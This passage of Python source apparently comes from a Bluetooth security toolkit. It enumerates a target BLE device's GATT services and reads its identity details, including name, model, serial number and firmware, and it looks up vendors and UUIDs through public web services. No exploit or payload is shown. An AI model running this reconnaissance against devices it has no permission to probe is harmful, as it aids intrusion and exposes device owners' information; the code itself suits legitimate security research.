        return None

    return None


# =============================================================================
# BLE CHARACTERISTIC RESEARCH UTILITIES
# =============================================================================

async def lookup_oui_vendor(mac_address: str) -> dict:
    """Look up the vendor/manufacturer from a MAC address OUI.

    Args:
        mac_address: MAC address in format XX:XX:XX:XX:XX:XX

    Returns:
        Dictionary with vendor information
    """
    import urllib.request
    import urllib.error
    import json

    # Clean the MAC address and extract OUI
    mac_clean = mac_address.replace(
        "/P", "").replace(":", "").replace("-", "").upper()
    oui = mac_clean[:6]

    result = {
        "oui": f"{oui[:2]}:{oui[2:4]}:{oui[4:6]}",
        "vendor": None,
        "address": None,
        "source": None
    }

    # Try macvendors.com API (simple and free)
    try:
        url = f"https://api.macvendors.com/{oui}"
        req = urllib.request.Request(
            url, headers={"User-Agent": "RACE-Toolkit/1.0"})
        with urllib.request.urlopen(req, timeout=5) as response:
            vendor = response.read().decode('utf-8').strip()
            if vendor and "Not Found" not in vendor:
                result["vendor"] = vendor
                result["source"] = "macvendors.com"
                return result
    except Exception:
        pass

    # Try maclookup.app API as fallback
    try:
        url = f"https://api.maclookup.app/v2/macs/{oui}"
        req = urllib.request.Request(
            url, headers={"User-Agent": "RACE-Toolkit/1.0"})
        with urllib.request.urlopen(req, timeout=5) as response:
            data = json.loads(response.read().decode('utf-8'))
            if data.get("success") and data.get("found"):
                result["vendor"] = data.get("company")
                result["address"] = data.get("address")
                result["source"] = "maclookup.app"
                return result
    except Exception:
        pass

    return result


async def search_uuid_github(uuid: str) -> list:
    """Search GitHub for information about a UUID.

    Args:
        uuid: The 128-bit UUID to search for

    Returns:
        List of dictionaries with search results
    """
    import urllib.request
    import urllib.error
    import urllib.parse
    import json

    results = []

    # Search GitHub code (note: requires no auth for basic search)
    try:
        # URL-encode the UUID
        encoded_uuid = urllib.parse.quote(f'"{uuid}"')
        url = f"https://api.github.com/search/code?q={encoded_uuid}&per_page=5"
        req = urllib.request.Request(url, headers={
            "User-Agent": "RACE-Toolkit/1.0",
            "Accept": "application/vnd.github.v3+json"
        })
        with urllib.request.urlopen(req, timeout=10) as response:
            data = json.loads(response.read().decode('utf-8'))
            if data.get("total_count", 0) > 0:
                for item in data.get("items", [])[:3]:
                    results.append({
                        "repo": item.get("repository", {}).get("full_name"),
                        "path": item.get("path"),
                        "url": item.get("html_url"),
                        "source": "GitHub"
                    })
    except Exception:
        pass

    return results


async def search_nordic_database(uuid: str) -> dict:
    """Search the Nordic Semiconductor Bluetooth Numbers Database.

    Args:
        uuid: The UUID to search for (short or long format)

    Returns:
        Dictionary with characteristic info if found
    """
    import urllib.request
    import json

    # Nordic maintains a public JSON database
    try:
        # Try the characteristics database
        url = "https://raw.githubusercontent.com/NordicSemiconductor/bluetooth-numbers-database/master/v1/characteristic_uuids.json"
        req = urllib.request.Request(
            url, headers={"User-Agent": "RACE-Toolkit/1.0"})
        with urllib.request.urlopen(req, timeout=10) as response:
            data = json.loads(response.read().decode('utf-8'))
            uuid_lower = uuid.lower()
            for entry in data:
                if entry.get("uuid", "").lower() == uuid_lower:
                    return {
                        "name": entry.get("name"),
                        "identifier": entry.get("identifier"),
                        "source": "Nordic Bluetooth Numbers Database"
                    }
    except Exception:
        pass

    return {}


async def analyze_uuid_patterns(uuids: list) -> dict:
    """Analyze a list of UUIDs to identify vendor patterns.

    Args:
        uuids: List of 128-bit UUID strings

    Returns:
        Dictionary with pattern analysis
    """
    analysis = {
        "total_uuids": len(uuids),
        "uuid_versions": {},
        "base_patterns": {},
        "likely_vendor": None,
        "common_base": None
    }

    # Known vendor base patterns (last 96 bits / 24 hex chars)
    KNOWN_BASES = {
        "0000-1000-8000-00805f9b34fb": "Bluetooth SIG (Standard)",
        "ba5e-f4ee-5ca1-eb1e5e4b1ce0": "Nordic Semiconductor (Legacy)",
        "451a-8ffc-0000-10008000002a": "Qualcomm",
        "5ca1-eb1e-5e4b-1ce000000000": "Nordic Semiconductor",
        "7700-8000-b042-88a1cd000000": "Texas Instruments",
    }

    for uuid in uuids:
        uuid = uuid.lower()

        # Skip short-format UUIDs (e.g., "uuid-16:2a28") - only analyze 128-bit UUIDs
        if not uuid or len(uuid) < 36 or "uuid-16" in uuid:
            continue

        # Determine UUID version from version nibble (position 14-15)
        # Format: xxxxxxxx-xxxx-Vxxx-xxxx-xxxxxxxxxxxx where V is version
        try:
            if len(uuid) >= 15 and uuid[14].isalnum():
                version_char = uuid[14]
                version = int(version_char, 16)
                version_name = {
                    1: "v1 (Time-based)",
                    2: "v2 (DCE Security)",
                    3: "v3 (MD5 Hash)",
                    4: "v4 (Random)",
                    5: "v5 (SHA-1 Hash)"
                }.get(version, f"v{version}")
                analysis["uuid_versions"][version_name] = analysis["uuid_versions"].get(
                    version_name, 0) + 1
        except (ValueError, IndexError):
            pass  # Skip if version parsing fails

        # Extract base pattern (last 24 chars - excludes the unique identifier portion)
        if len(uuid) >= 24:
            base = uuid[-24:]
            if base not in analysis["base_patterns"]:
                analysis["base_patterns"][base] = []
            analysis["base_patterns"][base].append(uuid)

    # Find most common base
    if analysis["base_patterns"]:
        most_common_base = max(analysis["base_patterns"].keys(),
                               key=lambda k: len(analysis["base_patterns"][k]))
        analysis["common_base"] = most_common_base
        analysis["common_base_count"] = len(
            analysis["base_patterns"][most_common_base])

        # Check against known vendor bases
        for known_base, vendor in KNOWN_BASES.items():
            if known_base in most_common_base or most_common_base in known_base:
                analysis["likely_vendor"] = vendor
                break

    return analysis


async def research_unknown_characteristics(unknown_chars: list, mac_address: str) -> dict:
    """Perform automated research on unknown characteristics.

    Args:
        unknown_chars: List of tuples (uuid, properties, service_name)
        mac_address: Device MAC address for OUI lookup

    Returns:
        Dictionary with all research results
    """
    import urllib.parse

    research = {
        "oui_lookup": None,
        "pattern_analysis": None,
        "uuid_findings": {},
        "github_results": {},
        "nordic_results": {}
    }

    # Lookup OUI vendor
    print(
        f"\n  \033[1;36m⟳ Looking up device manufacturer from MAC OUI...\033[0m")
    research["oui_lookup"] = await lookup_oui_vendor(mac_address)

    # Analyze UUID patterns
    print(f"  \033[1;36m⟳ Analyzing UUID patterns...\033[0m")
    uuids = [uuid for uuid, _, _ in unknown_chars]
    research["pattern_analysis"] = await analyze_uuid_patterns(uuids)

    # Search Nordic database for each UUID (rate limited)
    print(f"  \033[1;36m⟳ Searching Nordic Bluetooth Numbers Database...\033[0m")
    for uuid, props, svc in unknown_chars[:10]:  # Limit to first 10
        result = await search_nordic_database(uuid)
        if result:
            research["nordic_results"][uuid] = result

    # Search GitHub for first 3 unique base patterns (to avoid rate limits)
    print(f"  \033[1;36m⟳ Searching GitHub for UUID references...\033[0m")
    searched_bases = set()
    for uuid, props, svc in unknown_chars:
        if len(searched_bases) >= 3:
            break
        base = uuid[-24:] if len(uuid) >= 24 else uuid
        if base not in searched_bases:
            searched_bases.add(base)
            # Search for the full UUID
            results = await search_uuid_github(uuid)
            if results:
                research["github_results"][uuid] = results
            await asyncio.sleep(0.5)  # Rate limit

    return research


def print_research_results(research: dict, unknown_chars: list, term_width: int):
    """Print formatted research results.

    Args:
        research: Dictionary from research_unknown_characteristics()
        unknown_chars: Original list of unknown characteristics
        term_width: Terminal width for formatting
    """

    def print_header(title):
        print(f"\n\033[1;36m{'─' * term_width}\033[0m")
        print(f"\033[1;36m  {title}\033[0m")
        print(f"\033[1;36m{'─' * term_width}\033[0m")

    print_header("AUTOMATED RESEARCH RESULTS")

    # OUI Lookup Results
    oui = research.get("oui_lookup", {})
    print(f"\n  \033[1;33m📍 DEVICE MANUFACTURER (OUI Lookup)\033[0m")
    if oui.get("vendor"):
        print(f"     MAC OUI: \033[1;36m{oui.get('oui')}\033[0m")
        print(f"     Vendor: \033[1;32m{oui.get('vendor')}\033[0m")
        if oui.get("address"):
            print(f"     Address: {oui.get('address')}")
        print(f"     Source: {oui.get('source')}")
    else:
        print(f"     MAC OUI: \033[1;36m{oui.get('oui')}\033[0m")
        print(
            f"     \033[0;90mVendor not found in public databases (may be randomized MAC)\033[0m")

    # Pattern Analysis
    analysis = research.get("pattern_analysis", {})
    print(f"\n  \033[1;33m🔍 UUID PATTERN ANALYSIS\033[0m")

    if analysis.get("uuid_versions"):
        versions = ", ".join(
            f"{k}: {v}" for k, v in analysis["uuid_versions"].items())
        print(f"     UUID Versions: {versions}")

    base_patterns = analysis.get("base_patterns", {})
    print(f"     Unique Base Patterns: {len(base_patterns)}")

    if analysis.get("likely_vendor"):
        print(
            f"     \033[1;32mIdentified Vendor: {analysis['likely_vendor']}\033[0m")
    elif analysis.get("common_base"):
        print(f"     Common Base: {analysis['common_base']}")
        print(
            f"     Characteristics with this base: {analysis.get('common_base_count', 0)}")
        print(
            f"     \033[0;90m→ Search this pattern to identify the vendor SDK\033[0m")

    if len(base_patterns) == 1:
        print(
            f"     \033[1;32m✓ All UUIDs share the same base - likely from a single vendor SDK\033[0m")
    elif len(base_patterns) > 1:
        print(
            f"     \033[0;33m⚠ Multiple base patterns - device may use multiple vendor libraries\033[0m")

    # Nordic Database Results
    nordic = research.get("nordic_results", {})
    if nordic:
        print(f"\n  \033[1;33m📚 NORDIC DATABASE MATCHES\033[0m")
        for uuid, info in nordic.items():
            print(f"     \033[1;32m{info.get('name', 'Unknown')}\033[0m")
            print(f"       UUID: {uuid}")
            print(f"       ID: {info.get('identifier', 'N/A')}")

    # GitHub Results
    github = research.get("github_results", {})
    if github:
        print(f"\n  \033[1;33m🔗 GITHUB CODE REFERENCES\033[0m")
        for uuid, results in github.items():
            print(f"     UUID: {uuid[:8]}...{uuid[-4:]}")
            for r in results[:2]:
                print(f"       → \033[0;36m{r.get('repo')}\033[0m")
                print(f"         {r.get('path')}")
    else:
        print(f"\n  \033[1;33m🔗 GITHUB CODE REFERENCES\033[0m")
        print(
            f"     \033[0;90mNo public code references found (may need authenticated search)\033[0m")

    # Recommended next steps
    print(f"\n  \033[1;33m📋 RECOMMENDED NEXT STEPS\033[0m")

    vendor = oui.get("vendor") or analysis.get("likely_vendor")
    if vendor:
        print(
            f"     1. Search for \"{vendor} BLE SDK\" or \"{vendor} Bluetooth documentation\"")
        print(
            f"     2. Look for {vendor} developer portal or GitHub repositories")
    else:
        print(f"     1. Device may use a randomized MAC - check Device Information Service for vendor")

    # Show the UUIDs formatted for searching
    print(
        f"\n     \033[0;90mSearch these UUIDs in Google (copy with quotes):\033[0m")
    for uuid, props, svc in unknown_chars:
        print(f"       \"{uuid}\"")

    # FCC lookup suggestion if we found a vendor
    if vendor:
        vendor_search = vendor.replace(" ", "+").replace(",", "")
        print(
            f"\n     \033[0;90mFCC Database (may have protocol details):\033[0m")
        print(f"       https://fccid.io/search?q={vendor_search}")


async def command_ble_info(args: argparse.Namespace):
    """Enumerate BLE device information by connecting and reading GATT services.

    Connects to a BLE device and reads:
    - Device Name and Appearance (Generic Access Profile)
    - Manufacturer, Model, Serial, Firmware (Device Information Service)
    - All available GATT services and characteristics
    """
    import bumble.hci
    from bumble.device import Device, DeviceConfiguration, Peer
    from bumble.transport import open_transport_or_link
    from bumble.hci import Address
    from bumble.gatt import (
        GATT_GENERIC_ACCESS_SERVICE,
        GATT_DEVICE_NAME_CHARACTERISTIC,
        GATT_APPEARANCE_CHARACTERISTIC,
        GATT_DEVICE_INFORMATION_SERVICE,
        GATT_MANUFACTURER_NAME_STRING_CHARACTERISTIC,
        GATT_MODEL_NUMBER_STRING_CHARACTERISTIC,
        GATT_SERIAL_NUMBER_STRING_CHARACTERISTIC,
        GATT_FIRMWARE_REVISION_STRING_CHARACTERISTIC,
        GATT_HARDWARE_REVISION_STRING_CHARACTERISTIC,
        GATT_SOFTWARE_REVISION_STRING_CHARACTERISTIC,
    )
    import shutil

    controller = args.controller or "usb:0"
    target_address = args.target_address
    timeout = getattr(args, 'timeout', 30.0)

    if not target_address:
        logging.error(
            "Target address required. Use --target-address or run 'sniff --active' first.")
        return

    # Release Bluetooth controller
    release_bluetooth_controller(controller)

    # Well-known service UUIDs for device type identification
    SERVICE_TYPES = {
        "0000180f-0000-1000-8000-00805f9b34fb": ("Battery Service", "🔋"),
        "0000180a-0000-1000-8000-00805f9b34fb": ("Device Information", "ℹ️"),
        "00001800-0000-1000-8000-00805f9b34fb": ("Generic Access", "📱"),
        "00001801-0000-1000-8000-00805f9b34fb": ("Generic Attribute", "📋"),
        "0000180d-0000-1000-8000-00805f9b34fb": ("Heart Rate", "❤️"),
        "00001816-0000-1000-8000-00805f9b34fb": ("Cycling Speed/Cadence", "🚴"),
        "00001818-0000-1000-8000-00805f9b34fb": ("Cycling Power", "⚡"),
        "00001819-0000-1000-8000-00805f9b34fb": ("Location/Navigation", "📍"),
        "0000181a-0000-1000-8000-00805f9b34fb": ("Environmental Sensing", "🌡️"),
        "0000181c-0000-1000-8000-00805f9b34fb": ("User Data", "👤"),
        "0000181d-0000-1000-8000-00805f9b34fb": ("Weight Scale", "⚖️"),
        "0000181e-0000-1000-8000-00805f9b34fb": ("Bond Management", "🔗"),
        "00001802-0000-1000-8000-00805f9b34fb": ("Immediate Alert", "🚨"),
        "00001803-0000-1000-8000-00805f9b34fb": ("Link Loss", "📶"),
        "00001804-0000-1000-8000-00805f9b34fb": ("Tx Power", "📡"),
        "00001805-0000-1000-8000-00805f9b34fb": ("Current Time", "🕐"),
        "00001806-0000-1000-8000-00805f9b34fb": ("Reference Time", "⏱️"),
        "00001808-0000-1000-8000-00805f9b34fb": ("Glucose", "💉"),
        "00001809-0000-1000-8000-00805f9b34fb": ("Health Thermometer", "🌡️"),
        "0000110a-0000-1000-8000-00805f9b34fb": ("Audio Source", "🔊"),
        "0000110b-0000-1000-8000-00805f9b34fb": ("Audio Sink", "🎧"),
        "0000111e-0000-1000-8000-00805f9b34fb": ("Handsfree", "📞"),
        "0000111f-0000-1000-8000-00805f9b34fb": ("Handsfree AG", "📞"),
        "00001812-0000-1000-8000-00805f9b34fb": ("HID (Keyboard/Mouse)", "⌨️"),
        "0000fe07-0000-1000-8000-00805f9b34fb": ("Apple Notification", "🍎"),
        "89d3502b-0f36-433a-8ef4-c502ad55f8dc": ("Apple AirPods", "🎧"),
        "9fa480e0-4967-4542-9390-d343dc5d04ae": ("Apple Nearby", "📱"),
        "7905f431-b5ce-4e99-a40f-4b1e122d00d0": ("Apple Media", "🎵"),
        "d0611e78-bbb4-4591-a5f8-487910ae4366": ("Apple HomeKit", "🏠"),
    }

    # Well-known characteristic UUIDs with descriptions
    CHARACTERISTIC_NAMES = {
        "2a00": ("Device Name", "The user-friendly name of the device"),
        "2a01": ("Appearance", "Device appearance category (e.g., phone, watch)"),
        "2a02": ("Peripheral Privacy Flag", "Privacy settings for the device"),
        "2a03": ("Reconnection Address", "Address for reconnection"),
        "2a04": ("Peripheral Preferred Connection", "Preferred connection parameters"),
        "2a05": ("Service Changed", "Indicates GATT database has changed"),
        "2a19": ("Battery Level", "Current battery percentage (0-100%)"),
        "2a1a": ("Battery Power State", "Charging/discharging state"),
        "2a23": ("System ID", "Unique system identifier"),
        "2a24": ("Model Number", "Device model number string"),
        "2a25": ("Serial Number", "Device serial number"),
        "2a26": ("Firmware Revision", "Firmware version string"),
        "2a27": ("Hardware Revision", "Hardware version string"),
        "2a28": ("Software Revision", "Software version string"),
        "2a29": ("Manufacturer Name", "Manufacturer name string"),
        "2a2a": ("IEEE Regulatory Cert", "Regulatory certification data"),
        "2a37": ("Heart Rate Measurement", "Current heart rate in BPM"),
        "2a38": ("Body Sensor Location", "Where sensor is worn"),
        "2a39": ("Heart Rate Control Point", "Reset energy expended"),
        "2a4d": ("Report", "HID input/output report data"),
        "2a4e": ("Protocol Mode", "HID boot/report protocol mode"),
        "2a4a": ("HID Information", "HID version and country code"),
        "2a4b": ("Report Map", "HID report descriptor"),
        "2a4c": ("HID Control Point", "Suspend/exit suspend"),
        "2a50": ("PnP ID", "Vendor/Product ID information"),
        "2a6e": ("Temperature", "Temperature measurement"),
        "2a6f": ("Humidity", "Humidity percentage"),
        "2a76": ("UV Index", "UV radiation index"),
        "2a77": ("Irradiance", "Light irradiance value"),
        "2a78": ("Rainfall", "Rainfall measurement"),
        "2a79": ("Wind Speed", "Wind speed measurement"),
        "2aa1": ("Magnetic Flux Density 2D", "Compass data"),
        "2aa2": ("Magnetic Flux Density 3D", "3D compass data"),
    }

    # Vendor-specific 128-bit characteristic UUIDs (common ones from various manufacturers)
    VENDOR_CHARACTERISTICS = {
        # Nordic Semiconductor UART Service
        "6e400002-b5a3-f393-e0a9-e50e24dcca9e": ("Nordic UART RX", "Nordic", "Receive data from phone to device"),
        "6e400003-b5a3-f393-e0a9-e50e24dcca9e": ("Nordic UART TX", "Nordic", "Transmit data from device to phone"),
        # Texas Instruments SensorTag
        "f000aa01-0451-4000-b000-000000000000": ("TI Temperature Data", "Texas Instruments", "IR temperature sensor reading"),
        "f000aa02-0451-4000-b000-000000000000": ("TI Temperature Config", "Texas Instruments", "Temperature sensor configuration"),
        "f000aa11-0451-4000-b000-000000000000": ("TI Accelerometer Data", "Texas Instruments", "Accelerometer XYZ values"),
        "f000aa21-0451-4000-b000-000000000000": ("TI Humidity Data", "Texas Instruments", "Humidity sensor reading"),
        "f000aa31-0451-4000-b000-000000000000": ("TI Magnetometer Data", "Texas Instruments", "Compass/magnetometer reading"),
        "f000aa41-0451-4000-b000-000000000000": ("TI Barometer Data", "Texas Instruments", "Barometric pressure reading"),
        "f000aa51-0451-4000-b000-000000000000": ("TI Gyroscope Data", "Texas Instruments", "Gyroscope XYZ values"),
        # Apple
        "9b3c81d8-57b1-4a8a-b8df-0e56f7ca51c2": ("Apple Continuity", "Apple", "Continuity/Handoff data"),
        "69d1d8f3-45e1-49a8-9821-9bbdfdaad9d9": ("Apple Notification Source", "Apple", "iOS notification data"),
        "9fbf120d-6301-42d9-8c58-25e699a21dbd": ("Apple Control Point", "Apple", "ANCS control point"),
        "22eac6e9-24d6-4bb5-be44-b36ace7c7bfb": ("Apple Data Source", "Apple", "ANCS data source"),
        # Bose
        "f0001131-0451-4000-b000-000000000000": ("Bose Audio Control", "Bose", "Audio control commands"),
        "f0001132-0451-4000-b000-000000000000": ("Bose Audio Status", "Bose", "Audio status information"),
        # Fitbit
        "558dfa00-4fa8-4105-9f02-4eaa93e62980": ("Fitbit Live Data", "Fitbit", "Real-time fitness data"),
        "558dfa01-4fa8-4105-9f02-4eaa93e62980": ("Fitbit Control", "Fitbit", "Device control commands"),
        # Xiaomi
        "0000ff01-0000-1000-8000-00805f9b34fb": ("Xiaomi Activity Data", "Xiaomi", "Steps/activity information"),
        "0000ff02-0000-1000-8000-00805f9b34fb": ("Xiaomi Control Point", "Xiaomi", "Device control"),
        "0000ff03-0000-1000-8000-00805f9b34fb": ("Xiaomi User Info", "Xiaomi", "User profile data"),
        # JBL/Harman
        "02e19538-b50e-11ea-b3de-0242ac130004": ("JBL Control", "JBL/Harman", "Speaker control commands"),
        "02e1952a-b50e-11ea-b3de-0242ac130004": ("JBL Status", "JBL/Harman", "Speaker status"),
        # Sonos
        "7e846e42-fc81-4e53-8a2a-0d94a9e05f82": ("Sonos Control", "Sonos", "Speaker control"),
        # Google Fast Pair
        "fe2c1234-8366-4814-8eb0-01de32100bea": ("Google Fast Pair", "Google", "Fast Pair model ID"),
        "fe2c1235-8366-4814-8eb0-01de32100bea": ("Google Fast Pair Key", "Google", "Fast Pair key-based pairing"),
        "fe2c1236-8366-4814-8eb0-01de32100bea": ("Google Fast Pair Passkey", "Google", "Fast Pair passkey"),
        # Microsoft Swift Pair
        "0000fef3-0000-1000-8000-00805f9b34fb": ("Microsoft Swift Pair", "Microsoft", "Windows Swift Pair data"),
    }

    # Appearance values
    APPEARANCES = {
        0: "Unknown",
        64: "Phone",
        128: "Computer",
        192: "Watch",
        193: "Watch (Sports)",
        256: "Clock",
        320: "Display",
        384: "Remote Control",
        448: "Eye Glasses",
        512: "Tag",
        576: "Keyring",
        640: "Media Player",
        704: "Barcode Scanner",
        768: "Thermometer",
        832: "Heart Rate Sensor",
        896: "Blood Pressure",
        960: "HID",
        961: "Keyboard",
        962: "Mouse",
        963: "Joystick",
        964: "Gamepad",
        965: "Digitizer Tablet",
        966: "Card Reader",
        967: "Digital Pen",
        968: "Barcode Scanner (HID)",
        1024: "Glucose Meter",
        1088: "Running/Walking Sensor",
        1152: "Cycling",
        1216: "Control Device",
        1280: "Network Device",
        1344: "Sensor",
        1408: "Light Fixtures",
        1472: "Fan",
        1536: "HVAC",
        1600: "Air Conditioning",
        1664: "Humidifier",
        1728: "Heating",
        1792: "Access Control",
        1856: "Motorized Device",
        1920: "Power Device",
        1984: "Light Source",
        2048: "Window Covering",
        2112: "Audio Sink",
        2113: "Standalone Speaker",
        2114: "Soundbar",
        2115: "Bookshelf Speaker",
        2116: "Standmounted Speaker",
        2117: "Speakerphone",
        2176: "Audio Source",
        2177: "Microphone",
        2178: "Alarm",
        2240: "Wearable",
        2241: "Wristwatch",
        2242: "Pager",
        2243: "Jacket",
        2244: "Helmet",
        2245: "Glasses",
        2304: "Generic Outdoor Sports",
        2305: "Location Display",
        2306: "Location/Navigation Display",
        2307: "Location Pod",
        2308: "Location/Navigation Pod",
        3136: "Pulse Oximeter",
        3200: "Weight Scale",
        3264: "Personal Mobility Device",
        3328: "Insulin Pen",
        3392: "Continuous Glucose Monitor",
        5184: "Hearing Aid",
        5185: "In-Ear Hearing Aid",
        5186: "Behind-Ear Hearing Aid",
        5187: "Cochlear Implant",
    }

    term_width = shutil.get_terminal_size((80, 24)).columns

    def print_header(text):
        print(f"\n\033[1;36m{'─' * term_width}\033[0m")
        print(f"\033[1;36m  {text}\033[0m")
        print(f"\033[1;36m{'─' * term_width}\033[0m")

    def print_field(label, value, indent=2):
        if value:
            print(f"{' ' * indent}\033[1;33m{label}:\033[0m {value}")

    print(f"\n\033[1;36m{'═' * term_width}\033[0m")
    print(f"\033[1;36m  BLE DEVICE ENUMERATION\033[0m")
    print(f"\033[1;36m{'═' * term_width}\033[0m")
    print(f"\n  Target: \033[1;32m{target_address}\033[0m")
    print(f"  Connecting...\n")

    device = None
    connection = None
    t = None
    peer = None
    max_retries = 3

    try:
        t = await open_transport_or_link(controller)
        config = DeviceConfiguration()
        config.keystore = "JsonKeyStore"
        config.address = Address.generate_static_address()
        config.name = "BLEEnumerator"
        device = Device.from_config_with_hci(config, t.source, t.sink)
        await device.power_on()

        # Parse address - check for explicit type suffix
        addr_str = target_address.replace("/P", "").replace("/R", "")
        if "/P" in target_address:
            # Explicit public address
            address_types = [(Address.PUBLIC_DEVICE_ADDRESS, "public")]
        elif "/R" in target_address:
            # Explicit random address
            address_types = [(Address.RANDOM_DEVICE_ADDRESS, "random")]
        else:
            # Auto-detect: try public first (most common for commercial devices), then random
            address_types = [
                (Address.PUBLIC_DEVICE_ADDRESS, "public"),
                (Address.RANDOM_DEVICE_ADDRESS, "random")
            ]

        # Try each address type
        for addr_type, addr_type_name in address_types:
            target = Address(addr_str, addr_type)
            connection = None

            if len(address_types) > 1:
                print(f"  \033[1;33mTrying {addr_type_name} address...\033[0m")

            # Retry loop for connection and discovery
            for attempt in range(1, max_retries + 1):
                # Connect to target
                if attempt > 1:
                    print(
                        f"\n  \033[1;33mRetry {attempt}/{max_retries}...\033[0m")
                    # Cancel any pending connection and reset controller state
                    try:
                        await device.host.send_command(
                            bumble.hci.HCI_LE_Create_Connection_Cancel_Command()
                        )
                    except Exception:
                        pass
                    await asyncio.sleep(2.0)  # Give controller time to reset

                print(
                    f"  \033[1;33mConnecting to {addr_str} ({addr_type_name})...\033[0m")

                try:
                    connection = await asyncio.wait_for(
                        device.connect(target),
                        timeout=timeout
                    )
                except asyncio.TimeoutError:
                    print(
                        f"  \033[1;31mConnection timed out after {timeout}s\033[0m")
                    # Cancel the pending connection
                    try:
                        await device.host.send_command(
                            bumble.hci.HCI_LE_Create_Connection_Cancel_Command()
                        )
                    except Exception:
                        pass
                    if attempt == max_retries:
                        break  # Try next address type
                    continue
                except Exception as e:
                    print(f"  \033[1;31mConnection failed: {e}\033[0m")
                    if attempt == max_retries:
                        break  # Try next address type
                    continue

                print(f"  \033[1;32mConnected!\033[0m")
                print(f"  Connection Handle: 0x{connection.handle:04X}")

                # Create peer for GATT operations
                peer = Peer(connection)

                print(f"\n  \033[1;33mDiscovering GATT services...\033[0m")
                try:
                    await asyncio.wait_for(peer.discover_services(), timeout=15.0)
                    await asyncio.wait_for(peer.discover_characteristics(), timeout=15.0)
                    # Success - break out of both loops
                    break
                except asyncio.TimeoutError:
                    print(f"  \033[1;31mService discovery timed out\033[0m")
                    try:
                        await connection.disconnect()
                    except Exception:
                        pass
                    connection = None
                    peer = None
                    if attempt == max_retries:
                        break  # Try next address type
                    continue
                except (asyncio.CancelledError, Exception) as e:
                    err_msg = "Connection lost" if isinstance(
                        e, asyncio.CancelledError) else str(e)
                    print(
                        f"  \033[1;31mService discovery failed: {err_msg}\033[0m")
                    try:
                        if connection:
                            await connection.disconnect()
                    except Exception:
                        pass
                    connection = None
                    peer = None
                    if attempt == max_retries:
                        break  # Try next address type
                    continue

            # If we connected successfully, break out of address type loop
            if connection and peer:
                break

        if not peer or not connection:
            print(
                f"  \033[1;31mFailed to connect with any address type\033[0m")
            return

        # Collect device info
        device_info = {
            "name": None,
            "appearance": None,
            "appearance_name": None,
            "manufacturer": None,
            "model": None,
            "serial": None,
            "firmware": None,
            "hardware": None,
            "software": None,
            "battery": None,
        }

        services_found = []

        for service in peer.services:
            service_uuid = str(service.uuid).lower()
            service_name, service_icon = SERVICE_TYPES.get(
                service_uuid, (f"Unknown ({service.uuid})", "❓")
            )
            services_found.append(
                (service_uuid, service_name, service_icon, service))

            # Helper to check if UUID matches (handles both full and short format)
            def uuid_matches(char_uuid, short_id):
                """Check if characteristic UUID matches a short ID like '2a00'."""
                full_uuid = f"0000{short_id}-0000-1000-8000-00805f9b34fb"
                short_format = f"uuid-16:{short_id}"
                return char_uuid == full_uuid or char_uuid == short_format or short_id in char_uuid

            # Try to read characteristics
            for char in service.characteristics:
                try:
                    char_uuid_str = str(char.uuid).lower()

                    # Generic Access - Device Name (0x2A00)
                    if char.uuid == GATT_DEVICE_NAME_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a00"):
                        value = await peer.read_value(char)
                        if value:
                            device_info["name"] = value.decode(
                                'utf-8', errors='replace').strip('\x00')

                    # Generic Access - Appearance (0x2A01)
                    elif char.uuid == GATT_APPEARANCE_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a01"):
                        value = await peer.read_value(char)
                        if value and len(value) >= 2:
                            appearance = struct.unpack('<H', value[:2])[0]
                            device_info["appearance"] = appearance
                            device_info["appearance_name"] = APPEARANCES.get(
                                appearance, f"Unknown (0x{appearance:04X})"
                            )

                    # Device Information Service characteristics
                    elif char.uuid == GATT_MANUFACTURER_NAME_STRING_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a29"):
                        value = await peer.read_value(char)
                        if value:
                            device_info["manufacturer"] = value.decode(
                                'utf-8', errors='replace').strip('\x00')

                    elif char.uuid == GATT_MODEL_NUMBER_STRING_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a24"):
                        value = await peer.read_value(char)
                        if value:
                            device_info["model"] = value.decode(
                                'utf-8', errors='replace').strip('\x00')

                    elif char.uuid == GATT_SERIAL_NUMBER_STRING_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a25"):
                        value = await peer.read_value(char)
                        if value:
                            device_info["serial"] = value.decode(
                                'utf-8', errors='replace').strip('\x00')

                    elif char.uuid == GATT_FIRMWARE_REVISION_STRING_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a26"):
                        value = await peer.read_value(char)
                        if value:
                            device_info["firmware"] = value.decode(
                                'utf-8', errors='replace').strip('\x00')

                    elif char.uuid == GATT_HARDWARE_REVISION_STRING_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a27"):
                        value = await peer.read_value(char)
                        if value:
                            # Try to decode as UTF-8 string first
                            decoded = value.decode(
                                'utf-8', errors='replace').strip('\x00')
                            if decoded and decoded.isprintable():
                                device_info["hardware"] = decoded
                            else:
                                # Binary format - interpret as version bytes
                                if len(value) >= 2:
                                    version_parts = [str(b) for b in value]
                                    device_info["hardware"] = '.'.join(
                                        version_parts)
                                elif len(value) == 1:
                                    device_info["hardware"] = f"Rev {value[0]}"
                                else:
                                    device_info["hardware"] = value.hex()
                            logging.debug(
                                f"Read hardware revision: {value.hex()} -> '{device_info['hardware']}'")

                    elif char.uuid == GATT_SOFTWARE_REVISION_STRING_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a28"):
                        logging.debug(
                            f"Found software revision characteristic: {char.uuid}")
                        try:
                            value = await peer.read_value(char)
                            logging.debug(
                                f"Software revision raw value: {value.hex() if value else 'None'}")
                            if value:
                                # Try to decode as UTF-8 string first
                                decoded = value.decode(
                                    'utf-8', errors='replace').strip('\x00')
                                if decoded and decoded.isprintable():
                                    device_info["software"] = decoded
                                else:
                                    # Binary format - interpret as version bytes
                                    if len(value) >= 2:
                                        # Common format: major.minor or major.minor.patch.build
                                        version_parts = [str(b) for b in value]
                                        device_info["software"] = '.'.join(
                                            version_parts)
                                    else:
                                        device_info["software"] = value.hex()
                                logging.debug(
                                    f"Read software revision: {value.hex()} -> '{device_info['software']}'")
                            else:
                                device_info["software"] = None
                        except Exception as read_err:
                            logging.debug(
                                f"Failed to read software revision: {read_err}")

                    # Battery Level (0x2A19)
                    elif uuid_matches(char_uuid_str, "2a19"):
                        value = await peer.read_value(char)
                        if value:
                            device_info["battery"] = value[0]

                    # Battery Power State (0x2A1A)
                    elif uuid_matches(char_uuid_str, "2a1a"):
                        value = await peer.read_value(char)
                        if value:
                            device_info["battery_state"] = value[0]

                except Exception as e:
                    logging.debug(
